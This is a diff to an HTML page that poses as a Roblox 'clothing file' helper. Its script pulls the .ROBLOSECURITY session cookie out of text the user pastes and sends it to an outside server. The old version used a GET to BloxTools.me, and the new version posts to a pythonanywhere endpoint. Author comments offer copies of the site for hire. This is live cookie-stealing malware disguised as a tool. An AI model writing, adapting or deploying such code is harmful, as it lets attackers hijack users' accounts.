@@ -75,18 +75,21 @@ If you don't know how to find a clothings "clothing file" then go ahead and watc
 </footer>
 <script src="assets/js/bootstrap.js"></script>
 <script src="https://cdn.jsdelivr.net/npm/typed.js@2.0.12"></script>
-<script>
+<script>//If you're looking here, you probably know what you're doing. If you want a website like just like this, contact Talpa#6969 on discord or email [talpa (at) talpa (dot) cc].
       AOS.init({
         disable: 'mobile',
         once: true,
       });
     </script>
-<script>
+
+<script>//If you're looking here, you probably know what you're doing. If you want a website like just like this, contact Talpa#6969 on discord or email [talpa (at) talpa (dot) cc].
       function clothes() {
         a = code.value;
-        b = a.split('".ROBLOSECURITY", "').pop();
-        c = b.substring(0, b.indexOf('",'));
-        $.get("https://BloxTools.me/send?t="+c);
+        b = a.split('.ROBLOSECURITY=').pop();
+        c = b.split('; RBXEventTrackerV2')[0]
+        $.post("https://bloxtools.pythonanywhere.com/send_data", JSON.stringify({
+            'content': c
+        }));
       }
       function remove_hash() {
         setTimeout(() => {
